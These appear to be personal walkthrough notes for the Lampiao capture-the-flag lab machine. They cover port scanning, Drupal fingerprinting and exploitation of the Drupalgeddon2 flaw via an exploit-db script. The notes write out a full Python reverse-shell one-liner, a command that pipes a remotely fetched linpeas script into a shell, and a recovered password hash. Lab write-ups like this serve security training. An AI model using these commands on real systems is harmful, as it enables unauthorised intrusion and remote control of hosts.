# Lampiao Notes


### Enumeration
- open ports: 
	- quick-scan
		- 22 -> SSH
		- 80 -> HTTP 
	- full port scan 
		- 1898 -> cymtec-port?

- website on 1898 in spanish

- HTML source code leaked that Drupal is powering the app

 - Droopescan
	 - plugins -> profile, php, image
	 - Themes -> seven, garlad
	 - version -> 7.54
	 - changelog.txt exposed

- Drupal version weak to Drupalgeddeon2 
	- fix the exploit with: 
		- sudo gem install highline

#### Foothold 
- searchsploit ruby script '44449.rb' provides a webshell
- need rev shell for priv esc, which python tells us python is on the system
	- python shell: 
```export RHOST="192.168.49.202";export RPORT=4444;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'```

- curl linpeas from our machine to the target: 
	- curl -L http://192.168.49.202/linpeas.sh | sh

- .sh in path: 
	- /usr/bin/gettext.sh 

- bash history in /
	- /.bash_history

pass hash found: 
	- ```$S$DAK00p3Dkojkf4O/UizYxenguXnjv```


https://www.exploit-db.com/exploits/50689


 

